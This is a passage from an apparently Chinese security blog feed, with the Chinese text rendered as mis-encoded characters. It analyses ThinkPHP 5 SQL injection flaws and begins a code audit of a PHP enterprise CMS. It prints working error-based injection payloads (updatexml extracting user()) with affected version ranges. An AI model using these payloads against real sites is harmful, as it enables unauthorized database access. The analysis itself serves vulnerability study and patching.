src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>æœ€ç»ˆè¿”å›äº†ä¸€ä¸ªå¸¦æœ‰<code>ORDER BY</code> çš„ SQL æ³¨å…¥ payload ç»™è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼Œå®ç°<code>ORDER BY</code> æ³¨å…¥ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-4"><a href="#åˆ©ç”¨æ€»ç»“-4" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-4"><a href="#æ¼æ´ä¿®å¤-4" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥"><a href="#SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)"></a>SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>ä¸åŒç‰ˆæœ¬ <strong>payload</strong> éœ€ç¨ä½œè°ƒæ•´ï¼š</p><p><strong>5.0.0~5.0.21</strong> ã€ <strong>5.1.3ï½5.1.10</strong> ï¼š <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11ï½5.1.25</strong> ï¼š <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>è¿™é‡Œä»¥<code>5.1.25</code> ç‰ˆæœ¬çš„ThinkPHP è¿›è¡Œæ¼æ´åˆ†æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="å½±å“ç‰ˆæœ¬-5"><a href="#å½±å“ç‰ˆæœ¬-5" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> ã€ <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="æ¼æ´æ¦‚è¿°-5"><a href="#æ¼æ´æ¦‚è¿°-5" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äºæ‰€æœ‰ <strong>Mysql</strong> èšåˆå‡½æ•°ç›¸å…³æ–¹æ³•ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-5"><a href="#æ¼æ´åˆ†æ-5" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å’Œä¹‹å‰çš„åˆ†ææ€è·¯ä¸€æ ·ï¼Œå…ˆå»Github ä¸Šæ‰¾æ›´æ–°ç‰ˆæœ¬çš„commit è®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>æ–°å¢åŠ äº†ä¸€æ¡<code>if</code> åˆ¤æ–­ è¯­å¥ï¼Œç”¨æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>å’Œå‰å‡ ä¸ªThinkPHP 5 SQL æ³¨å…¥æ¼æ´ä¸€æ ·ï¼Œç¨‹åºéƒ½ä¼šè¿›å…¥åˆ°<code>Query</code> ç±»ä¸­ï¼Œæ­¤å¤„åœ¨<code>../application/index/controller/index.php</code> ä¸­ï¼Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼šå…ˆè¿›å…¥åˆ°<code>Query</code>ç±» çš„ <code>max</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>ç”¨æˆ·çš„è¾“å…¥ä¼ ç»™äº†<code>field</code> ï¼šid`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>ç„¶åè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº†<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥ç€è°ƒç”¨äº†<code>$this-&gt;connection</code> çš„ <code>aggregate</code>æ–¹æ³•ï¼Œè€Œ<code>$this-&gt;connection</code> ä¸º<code>think\db\connector\Mysql</code> ç±»ï¼Œè€Œ<code>Mysql</code>ç±»ç»§æ‰¿ä¸<code>Connection</code> ç±»ï¼Œæ•…è°ƒç”¨è¯¥ç±»çš„<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>$this-&gt;builder</code>ï¼Œæ­¤å¤„ä¸º<code>think\db\Builder\Mysql</code> ç±»çš„ <code>parseKey</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•å’ŒSQLæ³¨å…¥äº”èµ·åˆ°çš„ä½œç”¨ä¸€æ ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>ç†æ¸…äº†è°ƒç”¨æƒ…å†µã€‚å…·ä½“è¯´<code>parseKey</code>æ–¹æ³•çš„ä½œç”¨</p><blockquote><p><strong>parseKey</strong> æ–¹æ³•ä¸»è¦æ˜¯å¯¹å­—æ®µå’Œè¡¨åè¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œåªæ˜¯å¯¹æˆ‘ä»¬çš„æ•°æ®ä¸¤ç«¯éƒ½æ·»åŠ äº†åå¼•å·ã€‚ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†åï¼Œç¨‹åºåˆå›åˆ°äº†ä¸Šå›¾çš„ <strong>$this-&gt;value()</strong> æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>Builder</strong> ç±»çš„ <strong>select</strong> æ–¹æ³•æ¥æ„é€  <strong>SQL</strong> è¯­å¥ã€‚è¿™ä¸ªæ–¹æ³•åº”è¯¥è¯´æ˜¯åœ¨åˆ†æ <strong>ThinkPHP</strong> æ¼æ´æ—¶ï¼Œéå¸¸å¸¸è§çš„äº†ã€‚å…¶æ— éå°±æ˜¯ä½¿ç”¨ <strong>str_replace</strong> æ–¹æ³•ï¼Œå°†å˜é‡æ›¿æ¢åˆ° <strong>SQL</strong> è¯­å¥æ¨¡æ¿ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ <strong>parseField</strong> æ–¹æ³•ï¼Œå› ä¸ºç”¨æˆ·å¯æ§æ•°æ®å­˜å‚¨åœ¨ <strong>$options[â€˜fieldâ€™]</strong> å˜é‡ä¸­å¹¶è¢«ä¼ å…¥è¯¥æ–¹æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>parseFieid</code>æ–¹æ³•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// æ”¯æŒ &#x27;field1&#x27;=&gt;&#x27;field2&#x27; è¿™æ ·çš„å­—æ®µåˆ«åå®šä¹‰</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æœªåšä»»ä½•è¿‡æ»¤ï¼Œç”¨æˆ·å¯æ§æ•°æ®åªæ˜¯ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†ï¼Œå¹¶ä¸å½±å“æ•°æ®ï¼Œç„¶åç›´æ¥ç”¨é€—å·æ‹¼æ¥ï¼Œæœ€ç»ˆç›´æ¥æ›¿æ¢è¿› <strong>SQL</strong> è¯­å¥æ¨¡æ¿é‡Œï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„å‘ç”Ÿ</p><h2 id="åˆ©ç”¨æ€»ç»“-5"><a href="#åˆ©ç”¨æ€»ç»“-5" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤-5"><a href="#æ¼æ´ä¿®å¤-5" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå½“åŒ¹é…åˆ°é™¤äº† <strong>å­—æ¯ã€ç‚¹å·ã€æ˜Ÿå·</strong> ä»¥å¤–çš„å­—ç¬¦æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒå‡†å¤‡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQLæ³¨å…¥" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿä»£ç å®¡è®¡å­¦ä¹ (å¤ç°)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHPä»£ç å®¡è®¡åˆæ¬¡å°è¯•ä¹‹æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿ</a></p><p>å®¡è®¡æ€è·¯é€šè¿‡è„‘å›¾å¤§æ¦‚æ€»ç»“å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="äº†è§£ç³»ç»Ÿ"><a href="#äº†è§£ç³»ç»Ÿ" class="headerlink" title="äº†è§£ç³»ç»Ÿ"></a>äº†è§£ç³»ç»Ÿ</h1><p><strong>CMSåç§°</strong>ï¼šæ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»ŸPHPç‰ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>çœ‹ç€ç•Œé¢å°±çŸ¥é“æ˜¯ç”¨äºä¼ä¸šæ‰“å¹¿å‘Š(x)å’Œå‘å¸ƒä¿¡æ¯ï¼Œæ‹›è˜ç­‰åŠŸèƒ½çš„ç³»ç»Ÿã€‚ä¸”å­˜åœ¨å‰å°ç”¨æˆ·ç™»å½•å’Œåå°ç®¡ç†ç³»ç»Ÿã€‚å­˜åœ¨æœç´¢åŠŸèƒ½ã€‚</p><h1 id="é˜²æŠ¤ç­–ç•¥"><a href="#é˜²æŠ¤ç­–ç•¥" class="headerlink" title="é˜²æŠ¤ç­–ç•¥"></a>é˜²æŠ¤ç­–ç•¥</h1><h2 id="IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"><a href="#IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥" class="headerlink" title="IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"></a>IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥</h2><p>é™åˆ¶äº†å‰å°ã€åå°çš„ç™»å½•æ¬¡æ•°é™åˆ¶ã€æ³¨å†Œé™åˆ¶ã€å¯èƒ½ä¼šå½±å“åˆ°åé¢SQLæ³¨å…¥æ¼æ´çš„æµ‹è¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>å¯èƒ½å‡ºç°çš„æ¼æ´ï¼š<strong>ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ”»å‡»</strong></p><p>æ•°æ®åº“ç›‘æ§ï¼Œåœ¨æ³¨å†Œçš„åœ°æ–¹çœ‹çœ‹<code>ip</code> æ˜¯å¦è¢«å¸¦å…¥äº†æ•°æ®åº“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>å…¨å±€å®šä½åˆ°è·å–ç”¨æˆ·iPçš„ä»£ç éƒ¨åˆ†ï¼š</p><p>phpstorm æœç´¢ è·å–IPï¼Œå³å¯ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å®¢æˆ·ç«¯IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå½“ip é™¤å»<code>.</code>  åï¼Œå¦‚æœä¸æ˜¯çº¯æ•°å­—ï¼Œé‚£ä¹ˆå°±è®¾ç½®ä¸º 0.0.0.0 ã€‚å› æ­¤é€šè¿‡ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ˜¯è¡Œä¸é€šäº†ã€‚</p><h2 id="XSS-è¿‡æ»¤"><a href="#XSS-è¿‡æ»¤" class="headerlink" title="XSS è¿‡æ»¤"></a>XSS è¿‡æ»¤</h2><p>å‰å°å­˜åœ¨ç•™è¨€åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>æäº¤åï¼Œæˆ‘ä»¬ç™»å½•åå°ç®¡ç†å‘˜è¿›è¡ŒæŸ¥çœ‹ç•™è¨€å†…å®¹ã€‚ å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œjsä»£ç ã€‚</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;æ‚¨çš„ç½‘ç«™æœ‰äº†æ–°çš„ç•™è¨€&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span 